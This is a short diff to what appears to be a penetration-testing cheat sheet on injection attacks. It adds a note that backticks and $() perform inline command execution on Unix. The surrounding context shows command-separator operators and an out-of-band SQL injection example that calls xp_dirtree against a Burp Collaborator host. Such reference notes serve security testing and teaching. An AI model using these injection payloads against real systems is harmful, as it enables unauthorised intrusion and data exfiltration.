@@ -456,7 +456,9 @@ Ex : '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborat
 	                               &&
 				       |
 				       ||
-				       
+	On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
+                                     ` injected command `
+                                     $( injected command )			       
 	Ex : ls;
 
 *LDAP injection :
